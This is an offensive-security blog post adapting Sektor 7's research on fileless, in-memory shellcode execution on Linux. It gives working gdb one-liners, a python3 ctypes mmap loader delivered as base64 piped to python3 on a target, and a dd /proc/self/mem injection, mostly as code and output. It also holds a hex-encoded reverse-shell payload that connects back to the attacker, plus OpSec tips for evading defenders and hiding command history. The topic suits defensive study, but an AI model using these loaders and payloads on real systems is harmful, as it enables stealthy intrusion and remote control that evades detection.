---
title: "Operating In-Memory.. Linux (x64): Part 1"
date: 2023-02-17T15:17:41Z
draft: false
description: "This blog is heavily based on Sektor 7’s research, we will be making any changes required for modern systems before weaponizing it, using a standard reverse shell to gain an initial foothold. We’ll then see how far these techniques could be pushed, using the Sliver post exploitation framework."
---

> **_Warning:_** The techniques described in this blog should only be executed on systems that you own / have legal authority over.

This blog is *heavily* based on [Sektor 7’s research](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md), we will be making any changes required for modern systems before weaponizing it, using a standard reverse shell to gain an initial foothold. 

## Introduction
Let's say you get command execution on a a linux box, that could be by a webshell, ssh, whatever.. typically you'd need / want to run some additional post exploitation tools. Usually tools would be uploaded (or downloaded directly from random sources on the internet), however this opens us upto detection from the ~~victim~~ blue team. This would burn our access and potentially other hosts we might have compromised in the same fashion.

Here we'll take a look at a couple of ways to run code in memory only, ranging from shellcode, to eventually any binary we wish.. in this case, [Sliver](https://github.com/BishopFox/sliver) the post exploitation framework that's [made news recently](https://www.ncsc.gov.uk/files/Advisory%20Further%20TTPs%20associated%20with%20SVR%20cyber%20actors.pdf) for use by Cozy Bear aka APT29.


## Getting started

*fig.1* shows some very simple shellcode that we can run to print a message to the terminal, this will be handy for testing our techniques.

```nasm
bits 64
global _start
_start:
jmp short message

print:
pop rsi
xor rax,rax
mov al, 1
mov rdi, rax
xor rdx, rdx
add rdx, mlen
syscall

exit:
xor rax, rax
add rax, 60
xor rdi, rdi
syscall

message:
call print
msg: db 'https://offensive.ninja', 0x0A
mlen equ $ - msg
```

Let’s check that our shellcode actually works, feel free ([this looks like a nice tutorial](https://cs.lmu.edu/~ray/notes/nasmtutorial/)) to write your own or use another example

```nasm
➜  in-memory nasm -f elf64 sc.asm
➜  in-memory ld sc.o 
➜  in-memory ./a.out 
https://offensive.ninja
```

All we’re doing here is assembling our shellcode into an `elf64` object file and then using `ld` (the linker) to produce a binary.

## GDB

To paraphrase Sektor 7, GNU Debugger is the default debugging tool for Linux. It is **not installed by default** on most servers.

The gdb man page describes it’s functionality as follows:

```nasm
GDB can do four main kinds of things (plus other things in support of these) to 
help you catch bugs in the act:
 * Start your program, specifying anything that might affect its behavior.
 * Make your program stop on specified conditions.
 * Examine what has happened, when your program has stopped.
 * Change things in your program, so you can experiment with correcting the effects
   of one bug and go on to learn about another.
```

It’s the last part that let’s us run shellcode, because as we know, debuggers allow the program to be instrumented. We can ~~use~~ abuse normal functionality to make our shellcode execute in memory only, without it ever being on the disk.

> **_OpSec:_** Your command history might still be being saved or captured by protective monitoring solutions, take steps to ensure that this isn’t happening.

### Prep

Firstly, we need to convert our shellcode into a raw binary file:

```nasm
➜  in-memory nasm sc.asm
➜  in-memory ls
sc  sc.asm
```

This is short hand for the full command `nasm -f bin sc.asm`, in distribution versions of `nasm` the output always defaults to `bin` if the `-f` option is not supplied. However, you can change this behavior if you compile your own version and redefine `OF_DEFAULT.`

Finally we convert it to a byte string, and remove the line breaks

```nasm
➜  in-memory xxd -i sc | tr -d "\n"; echo
unsigned char sc[] = {  0xeb, 0x1e, 0x5e, 0x48, 0x31, 0xc0, 0xb0, 0x01, 0x48, 0x89, 0xc7, 0x48,  0x31, 0xd2, 0x48, 0x83, 0xc2, 0x18, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0x48,  0x83, 0xc0, 0x3c, 0x48, 0x31, 0xff, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,  0xff, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x6f, 0x66, 0x66,  0x65, 0x6e, 0x73, 0x69, 0x76, 0x65, 0x2e, 0x6e, 0x69, 0x6e, 0x6a, 0x61,  0x0a};unsigned int sc_len = 61;
```

### Injecting the shellcode

This is actually quite simple, we just set a breakpoint at `main()` inject the shellcode and continue. You can do this manually using the GDB console, or (as Sektor7 show) do it as a one liner:

```nasm
➜  in-memory gdb -q -ex "break main" -ex "r" -ex 'set (char[61])*(int*)$rip = {  0xeb, 0x1e, 0x5e, 0x48, 0x31, 0xc0, 0xb0, 0x01, 0x48, 0x89, 0xc7, 0x48,  0x31, 0xd2, 0x48, 0x83, 0xc2, 0x18, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0x48,  0x83, 0xc0, 0x3c, 0x48, 0x31, 0xff, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,  0xff, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x6f, 0x66, 0x66,  0x65, 0x6e, 0x73, 0x69, 0x76, 0x65, 0x2e, 0x6e, 0x69, 0x6e, 0x6a, 0x61,  0x0a}' -ex "c" -ex "q" /bin/bash
Reading symbols from /bin/bash...
(No debugging symbols found in /bin/bash)
Breakpoint 1 at 0x31340
Starting program: /usr/bin/bash 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555585340 in main ()
Continuing.
https://offensive.ninja
[Inferior 1 (process 17179) exited normally]
```

If you changed the shellcode, or indeed used your own, you will need to change the `char[61]` value to match. Thankfully the output of fig.2 gives you the length, so it’s a case of replacing the value.

As you can see, our code was executed, as `[https://offensive.ninja](https://offensive.ninja)` was printed out to the console.

Let’s try something a little more useful…

```nasm
root@research:/home/ninja/Desktop/in-memory/revshell# gdb -q -ex "break main" -ex "r" -ex 'set (char[104])*(int*)$rip = {  0x6a, 0x29, 0x58, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x99, 0x0f, 0x05,  0x48, 0x97, 0x52, 0x48, 0xbb, 0xfd, 0xff, 0xee, 0xa3, 0x80, 0xff, 0xff,  0xfe, 0x48, 0xf7, 0xd3, 0x53, 0x54, 0x5e, 0xb0, 0x2a, 0xb2, 0x10, 0x0f,  0x05, 0x6a, 0x03, 0x5e, 0xb0, 0x21, 0xff, 0xce, 0x0f, 0x05, 0xe0, 0xf8,  0x48, 0x31, 0xff, 0x50, 0x54, 0x5e, 0xb2, 0x08, 0x0f, 0x05, 0x48, 0x91,  0x48, 0xbb, 0x6c, 0x65, 0x74, 0x6d, 0x65, 0x69, 0x6e, 0x0a, 0x53, 0x54,  0x5f, 0xf3, 0xa6, 0x75, 0x1a, 0x6a, 0x3b, 0x58, 0x99, 0x52, 0x48, 0xbb,  0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x53, 0x54, 0x5f, 0x52,  0x54, 0x5a, 0x57, 0x54, 0x5e, 0x0f, 0x05, 0x90}' -ex "c" -ex "q" /bin/bash
Reading symbols from /bin/bash...
(No debugging symbols found in /bin/bash)
Breakpoint 1 at 0x31340
Starting program: /usr/bin/bash 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555585340 in main ()
Continuing.
```

Here we’re running a more complex bit of shell code, that connects back to us:

![Untitled](/img/term.png)

Upon connection we have to send the string `letmein` otherwise the connection is killed, but we then have a (limited) shell running under the context of the gdb executing user. This was a quick example to show that we can load in any shellcode that we like.

[You can find this on here](https://github.com/Offensive-Ninja/Shellcode/blob/main/Reverse-Shells/rvshell-with-password.asm)

<aside>
💡 if you get `error: instruction not supported in 16-bit mode` while trying to create a raw binary, make sure your shellcode includes `bits 64` at it’s beginning (and is of course x64 shellcode!).

</aside>

 Mind we’re getting ahead of ourselves.. let’s look at the rest of Sektor7’s blog.. we’ll come back to this in part 2.

> **_OpSec:_** This shell could be used to pull in arbitrary elfs, such as a Sliver Implant.. however we’d be touching the disk. At this stage we’re purely in memory.

## Python3

Unlike GDB, python is installed on most Linux systems. Sektor 7 shows us a python2 script, that loads shellcode into memory.

The script:

- loads the `libc` library into the Python process
- `mmap()` a new `W+X` memory region for the shellcode
- copy the shellcode into a newly allocated buffer
- make the buffer ‘callable’ (casting)
- call the buffer

In order to do this, python uses `ctypes` which basically allow the use of C functions and data types. Therefore effectively we can create c like scripts using python, including access to kernel syscalls.

Due to the slight differences between python 2 and 3, their script will not work, however, here is a fully python3 compatible version:

```python
#!/usr/bin/env python3
from ctypes import (CDLL, c_void_p, c_size_t, c_int, c_long, memmove, CFUNCTYPE, cast, pythonapi)
from ctypes.util import ( find_library)
from sys import exit

PROT_READ = 0x01
PROT_WRITE = 0x02
PROT_EXEC=0x04
MAP_PRIVATE = 0x02
MAP_ANONYMOUS = 0x20
ENOMEM = -1

#SHELLCODE = ''
SHELLCODE = b'\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x31\xd2\x48\x83\xc2\x15\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x45\x78\x20\x6e\x69\x68\x69\x6C\x67\x20\x6E\x69\x68\x69\x6C\x20\x66\x69\x74\x21\x0a'

libc = CDLL(find_library('c'))

#void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off); mmap.argtypes = [c_void_p, c_size_t, c_int, c_int, c_int, c_size_t ]

mmap = libc.mmap

mmap.restype = c_void_p

page_size = pythonapi.getpagesize()

sc_size = len(SHELLCODE)

#mem_size = page_size* (1 + sc_size / page_size)
mem_size = page_size * (1 + sc_size // page_size)

cptr = mmap(0, mem_size, PROT_READ|PROT_WRITE | PROT_EXEC, MAP_PRIVATE|

MAP_ANONYMOUS, -1, 0)

if cptr == ENOMEM: exit(' mmap() memory allocation error')

if sc_size <= mem_size:
    memmove(cptr, SHELLCODE, sc_size)
    sc = CFUNCTYPE(c_void_p, c_void_p)
    call_sc = cast(cptr, sc)
    call_sc(None)
```

I’ve commented out the lines that had to be changed, as you can see, it’s a very minor, yet breaking change.

### ~~Weaponizing~~ Productionizing it

```bash
➜  python cat runSC.py| base64 -w0; echo
IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwpmcm9tIGN0eXBlcyBpbXBvcnQgKENETEwsIGNfdm9pZF9wLCBjX3NpemVfdCwgY19pbnQsIGNfbG9uZywgbWVtbW92ZSwgQ0ZVTkNUWVBFLCBjYXN0LCBweXRob25hcGkpCmZyb20gY3R5cGVzLnV0aWwgaW1wb3J0ICggZmluZF9saWJyYXJ5KQpmcm9tIHN5cyBpbXBvcnQgZXhpdAoKClBST1RfUkVBRCA9IDB4MDEKUFJPVF9XUklURSA9IDB4MDIKUFJPVF9FWEVDPTB4MDQKTUFQX1BSSVZBVEUgPSAweDAyCk1BUF9BTk9OWU1PVVMgPSAweDIwCkVOT01FTSA9IC0xCgojU0hFTExDT0RFID0gJycKU0hFTExDT0RFID0gYidceGViXHgxZVx4NWVceDQ4XHgzMVx4YzBceGIwXHgwMVx4NDhceDg5XHhjN1x4NDhceDMxXHhkMlx4NDhceDgzXHhjMlx4MTVceDBmXHgwNVx4NDhceDMxXHhjMFx4NDhceDgzXHhjMFx4M2NceDQ4XHgzMVx4ZmZceDBmXHgwNVx4ZThceGRkXHhmZlx4ZmZceGZmXHg0NVx4NzhceDIwXHg2ZVx4NjlceDY4XHg2OVx4NkNceDY3XHgyMFx4NkVceDY5XHg2OFx4NjlceDZDXHgyMFx4NjZceDY5XHg3NFx4MjFceDBhJwoKbGliYyA9IENETEwoZmluZF9saWJyYXJ5KCdjJykpCgojdm9pZCAqbW1hcCh2b2lkICphZGRyLCBzaXplX3QgbGVuLCBpbnQgcHJvdCwgaW50IGZsYWdzLCBpbnQgZmlsZGVzLCBvZmZfdCBvZmYpOyBtbWFwLmFyZ3R5cGVzID0gW2Nfdm9pZF9wLCBjX3NpemVfdCwgY19pbnQsIGNfaW50LCBjX2ludCwgY19zaXplX3QgXQoKbW1hcCA9IGxpYmMubW1hcAoKbW1hcC5yZXN0eXBlID0gY192b2lkX3AKCnBhZ2Vfc2l6ZSA9IHB5dGhvbmFwaS5nZXRwYWdlc2l6ZSgpCgpzY19zaXplID0gbGVuKFNIRUxMQ09ERSkKCiNtZW1fc2l6ZSA9IHBhZ2Vfc2l6ZSogKDEgKyBzY19zaXplIC8gcGFnZV9zaXplKQptZW1fc2l6ZSA9IHBhZ2Vfc2l6ZSAqICgxICsgc2Nfc2l6ZSAvLyBwYWdlX3NpemUpCgpjcHRyID0gbW1hcCgwLCBtZW1fc2l6ZSwgUFJPVF9SRUFEfFBST1RfV1JJVEUgfCBQUk9UX0VYRUMsIE1BUF9QUklWQVRFfAoKTUFQX0FOT05ZTU9VUywgLTEsIDApCgppZiBjcHRyID09IEVOT01FTTogZXhpdCgnIG1tYXAoKSBtZW1vcnkgYWxsb2NhdGlvbiBlcnJvcicpCgppZiBzY19zaXplIDw9IG1lbV9zaXplOgogICAgbWVtbW92ZShjcHRyLCBTSEVMTENPREUsIHNjX3NpemUpCiAgICBzYyA9IENGVU5DVFlQRShjX3ZvaWRfcCwgY192b2lkX3ApCiAgICBjYWxsX3NjID0gY2FzdChjcHRyLCBzYykKICAgIGNhbGxfc2MoTm9uZSk=
```

We  take the whole script and convert it into a base64 string, this can then be executed on the target machine with the following:

```python
#!/bin/bash
echo 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwpmcm9tIGN0eXBlcyBpbXBvcnQgKENETEwsIGNfdm9pZF9wLCBjX3NpemVfdCwgY19pbnQsIGNfbG9uZywgbWVtbW92ZSwgQ0ZVTkNUWVBFLCBjYXN0LCBweXRob25hcGkpCmZyb20gY3R5cGVzLnV0aWwgaW1wb3J0ICggZmluZF9saWJyYXJ5KQpmcm9tIHN5cyBpbXBvcnQgZXhpdAoKClBST1RfUkVBRCA9IDB4MDEKUFJPVF9XUklURSA9IDB4MDIKUFJPVF9FWEVDPTB4MDQKTUFQX1BSSVZBVEUgPSAweDAyCk1BUF9BTk9OWU1PVVMgPSAweDIwCkVOT01FTSA9IC0xCgpTSEVMTENPREUgPSBiJ1x4ZWJceDFlXHg1ZVx4NDhceDMxXHhjMFx4YjBceDAxXHg0OFx4ODlceGM3XHg0OFx4MzFceGQyXHg0OFx4ODNceGMyXHgxNVx4MGZceDA1XHg0OFx4MzFceGMwXHg0OFx4ODNceGMwXHgzY1x4NDhceDMxXHhmZlx4MGZceDA1XHhlOFx4ZGRceGZmXHhmZlx4ZmZceDQ1XHg3OFx4MjBceDZlXHg2OVx4NjhceDY5XHg2Q1x4NjdceDIwXHg2RVx4NjlceDY4XHg2OVx4NkNceDIwXHg2Nlx4NjlceDc0XHgyMVx4MGEnCgpsaWJjID0gQ0RMTChmaW5kX2xpYnJhcnkoJ2MnKSkKCiN2b2lkICptbWFwKHZvaWQgKmFkZHIsIHNpemVfdCBsZW4sIGludCBwcm90LCBpbnQgZmxhZ3MsIGludCBmaWxkZXMsIG9mZl90IG9mZik7IG1tYXAuYXJndHlwZXMgPSBbY192b2lkX3AsIGNfc2l6ZV90LCBjX2ludCwgY19pbnQsIGNfaW50LCBjX3NpemVfdCBdCgptbWFwID0gbGliYy5tbWFwCgptbWFwLnJlc3R5cGUgPSBjX3ZvaWRfcAoKcGFnZV9zaXplID0gcHl0aG9uYXBpLmdldHBhZ2VzaXplKCkKCnNjX3NpemUgPSBsZW4oU0hFTExDT0RFKQoKI21lbV9zaXplID0gcGFnZV9zaXplKiAoMSArIHNjX3NpemUgLyBwYWdlX3NpemUpCm1lbV9zaXplID0gcGFnZV9zaXplICogKDEgKyBzY19zaXplIC8vIHBhZ2Vfc2l6ZSkKCgoKY3B0ciA9IG1tYXAoMCwgbWVtX3NpemUsIFBST1RfUkVBRHxQUk9UX1dSSVRFIHwgUFJPVF9FWEVDLCBNQVBfUFJJVkFURXwKCgoKCgpNQVBfQU5PTllNT1VTLCAtMSwgMCkKCmlmIGNwdHIgPT0gRU5PTUVNOiBleGl0KCcgbW1hcCgpIG1lbW9yeSBhbGxvY2F0aW9uIGVycm9yJykKCmlmIHNjX3NpemUgPD0gbWVtX3NpemU6CiAgICBtZW1tb3ZlKGNwdHIsIFNIRUxMQ09ERSwgc2Nfc2l6ZSkKICAgIHNjID0gQ0ZVTkNUWVBFKGNfdm9pZF9wLCBjX3ZvaWRfcCkKICAgIGNhbGxfc2MgPSBjYXN0KGNwdHIsIHNjKQogICAgY2FsbF9zYyhOb25lKQ==' | base64 --decode | python3
```

Again some slight changes were made to accommodate python3, but this could be a very interesting capability when combined with some more *pointy* shellcode.

> **_OpSec:_** The same OpSec warning as the GDB section should be taken into account


## Self-Modifying dd

If you ask [notion ai](https://www.notion.so/product/ai) to describe `dd` it’ll give you the following, which sums it up quite nicely:

“*The command `dd` is a utility for copying and converting files. It can be used to copy and convert a file, or even to create a disk image. `dd` can also be used for low-level operations such as self-modifying code and data recovery. It is commonly used to convert and copy a file, creating a disk image from a device, or to back up and restore an entire disk.”*

`dd` is installed on most Linux systems by default (it’s a part of the *********coreutils********* package), it’s a little bit tricker, but there is a very small opportunity to run shellcode in memory.

I’m going to paraphrase most of this from Sektor7, but there’s a few bits that are important, in order to make sure this works on your target system.

### Getting started

The first thing needed is **a place to copy shellcode inside the dd process**. The entire procedure must be stable and reliable across runs since it's a running process overwriting its own memory.

A good candidate is the code that’s called after the copy/overwrite is successful. It directly translates to **process exit**. Shellcode injection can be done either in the PLT (Procedure Linkage Table) or somewhere inside the main code segment at exit() call, or just before the exit().

Overwriting the PLT is highly unstable, because if our shellcode is too long it can overwrite some critical parts that are used before the exit() call is invoked.

After some investigation, it appears the fclose(3) function is called just before the exit():

```bash
ninja@debian:~$ ltrace dd if=/dev/zero of=/dev/null bs=1 count=1
getenv("POSIXLY_CORRECT")                                                            = nil
sigemptyset(<>)                                                                      = 0
sigaddset(<9>, SIGUSR1)                                                              = 0
sigaction(SIGINT, nil, { 0, <>, 0, 0 })                                              = 0
sigaddset(<1,9>, SIGINT)                                                             = 0
sigismember(<1,9>, SIGUSR1)                                                          = 1
sigaction(SIGUSR1, { 0x56396b81d340, <1,9>, 0, 0 }, nil)                             = 0
sigismember(<1,9>, SIGINT)                                                           = 1
sigaction(SIGINT, { 0x56396b81d330, <1,9>, 0, 0 }, nil)                              = 0
[......]
__freading(0x7faa31d835c0, 0, 0x56396b81d860, 1)                                     = 0
__freading(0x7faa31d835c0, 0, 0x56396b81d860, 1)                                     = 0
fflush(0x7faa31d835c0)                                                               = 0
fclose(0x7faa31d835c0)                                                               = 0
+++ exited (status 0) +++
```

`fclose()` is called from 2 places: 

```bash
ninja@debian:~$ objdump -Mintel -d `which dd` | grep fclose
0000000000002160 <fclose@plt>:
    aab6:       e8 a5 76 ff ff          call   2160 <fclose@plt>
    aaeb:       e9 70 76 ff ff          jmp    2160 <fclose@plt>
```

> **_Note:_** This is where things differ, Sektor7’s blog shows different function addresses, that’s because they were targeting a different build of `dd` . So make sure you check the version running on target, or this will not work.

For the sake of brevity, I’m going to skip over the obstacles section of their post, so go and check that our before carrying on (if you’re following along).

### Shellcode modification

As mentioned in their blog, we need to modify our shellcode with `dup()` syscalls.

Here’s the block we need to prefix

```nasm
;dup(10) + dup(11)
xor rax,rax
xor rdi,rdi
mov di,10
mov rax,0x20
syscall
```

Taking our previous shellcode, it would look like:

```nasm
bits 64

global _start

;dup(10) + dup(11)
xor rax,rax
xor rdi,rdi
mov di,10
mov rax,0x20
syscall

xor rax,rax
inc rdi
mov rax,0x20
syscall

_start:
    jmp short message

print:
    pop rsi
    xor rax,rax
    mov al,1
    mov rdi,rax
    xor rdx,rdx
    add rdx,mlen
    syscall

exit:
    xor rax,rax
    add rax,60
    xor rdi, rdi
    syscall

message:
    call print
    msg: db 'https://offensive.ninja',0x0A
    mlen equ $ - msg
```

### Executing shellcode using self-modifying dd:

```bash
ninja@debian:~$ echo -n -e "\x48\x31\xc0\x48\x31\xff\x66\xbf\x0a\x00\xb8\x20\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\xff\xc7\xb8\x20\x00\x00\x00\x0f\x05\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x31\xd2\x48\x83\xc2\x18\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x66\x66\x65\x6e\x73\x69\x76\x65\x2e\x6e\x69\x6e\x6a\x61\x0a" | setarch x86_64 -R dd of=/proc/self/mem bs=1 seek=$(( 0x555555554000 + 0xaaeb )) conv=notrunc 10<&0 11<&1
91+0 records in
91+0 records out
91 bytes copied, 0.00143789 s, 63.3 kB/s
https://offensive.ninja
```

The very important thing here is that the `seek=$(( 0x{func1} + 0x{func2} )` call is set correctly. You can see that we found `func2` from fig,3 at `0xaaeb` (`jmp 216` ), if this is incorrect, your shellcode cannot execute.

## Source & tooling
You can find the majority of the code here on [Github](https://github.com/orgs/Offensive-Ninja/repositories), please open any issues and I'll try my best to help out. 

### Tools
* GCHQ's [CyberChef](https://gchq.github.io/CyberChef/) is a fantastic resource for dealing with any kind of encoding.
* redteam.cafe's [shellcode formatter](https://www.redteam.cafe/red-team/shellcode-injection/shellcode-formatter), there's a slightly modded version [on github](https://github.com/Offensive-Ninja/Python-Scripts/blob/main/format_sc.py)
## In Part 2..
We'll look at how you can load fully fledged implants into memory, and move on from a simple reverse shell. We might have a look at creating some tooling to make the process easier too.